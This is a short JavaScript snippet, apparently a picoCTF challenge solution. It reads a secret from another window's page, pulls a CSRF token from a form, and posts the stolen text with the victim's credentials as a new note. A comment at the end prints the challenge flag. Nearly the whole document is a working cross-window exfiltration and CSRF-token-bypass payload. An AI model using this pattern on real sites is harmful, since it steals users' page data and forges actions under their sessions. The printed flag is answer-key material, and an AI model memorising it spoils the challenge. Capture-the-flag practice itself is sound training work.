    let fW = window.open('', 'w'); 
    let flag = fW.document.documentElement.innerText;
    let y = new XMLHttpRequest()
    y.onreadystatechange = function() {
    if (y.readyState == 4) {
        parser = new DOMParser();
        let g = parser.parseFromString(y.responseText, "text/html")
        let s = g.getElementsByName('_csrf')[0].value
    fetch('http://0.0.0.0:8080/new', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            _csrf: s,
            title: 'You are incredible',
            content: flag,
        }),
    })
    }
    };
    y.open("GET", "http://0.0.0.0:8080/new", true);
    y.send();

// picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}